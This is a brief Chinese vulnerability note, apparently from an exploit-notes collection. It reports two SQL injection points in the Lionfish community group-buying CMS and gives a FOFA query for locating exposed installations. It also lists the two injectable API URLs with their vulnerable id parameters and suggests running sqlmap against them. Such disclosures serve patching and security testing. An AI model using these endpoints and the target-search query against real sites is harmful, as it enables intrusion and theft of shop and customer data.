# 狮子鱼社区团购系统CMS存在两处SQL注入

## 漏洞描述

狮子鱼社区团购系统CMS存在SQL注入

## 漏洞影响

> 狮子鱼社区团购系统

## FOFA

> "/seller.php?s=/Public/login"

## 代码审计

###SQL注入（1）

```
http://localhost/index.php?s=api/goods/get_goods_detail&id=1* id为注入参数
```

![1](resource/狮子鱼社区团购系统SQL注入/1.png)

![2](resource/狮子鱼社区团购系统SQL注入/2.png)

 

###SQL注入（2）

```
http://localhost/index.php?s=api/goods_detail&goods_id=1* id为注入参数
```

![3](resource/狮子鱼社区团购系统SQL注入/3.png)

![4](resource/狮子鱼社区团购系统SQL注入/4.png)

直接sqlmap梭哈：

![5](resource/狮子鱼社区团购系统SQL注入/5.png)